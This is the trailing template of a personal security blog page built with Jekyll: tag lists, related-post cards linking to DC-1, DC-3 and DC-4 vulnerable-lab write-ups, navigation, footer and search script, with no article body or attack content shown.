id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/posts/dc1-en/"><div class="card-body"> <span class="timeago small" > Jun 6, 2020 <i class="unloaded">2020-06-06T09:46:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DC-1 - WRITE-UP</h3><div class="text-muted small"><p> MAIN INFORMATION BOX NAME: DC: 1 DESCRIPTION 1 2 3 4 5 6 7 8 9 10 11 12 13 DC-1 is a purposely built vulnerable lab to gain experience in the world of penetration testing. It was designed to be a...</p></div></div></a></div><div class="card"> <a href="/blog/posts/dc3-en/"><div class="card-body"> <span class="timeago small" > Jun 8, 2020 <i class="unloaded">2020-06-08T09:46:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DC-3 - WRITE-UP</h3><div class="text-muted small"><p> MAIN INFORMATION BOX NAME: DC: 3.2 DESCRIPTION 1 2 3 4 5 6 7 8 9 10 11 DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As ...</p></div></div></a></div><div class="card"> <a href="/blog/posts/dc4-en/"><div class="card-body"> <span class="timeago small" > Jun 9, 2020 <i class="unloaded">2020-06-09T09:46:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DC-4 - WRITE-UP</h3><div class="text-muted small"><p> MAIN INFORMATION BOX NAME: DC: 4 DESCRIPTION 1 2 3 4 5 6 7 DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. Unlike the pre...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/posts/how-to-create-your-own-blog-using-jekyll-en/" class="btn btn-outline-primary" prompt="Older"><p>How to create your own blog - Jekyll</p></a> <a href="/blog/posts/dc1-en/" class="btn btn-outline-primary" prompt="Newer"><p>DC-1 - WRITE-UP</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/cloufisz">Bartholomew Mokrzycki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://cloufish.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
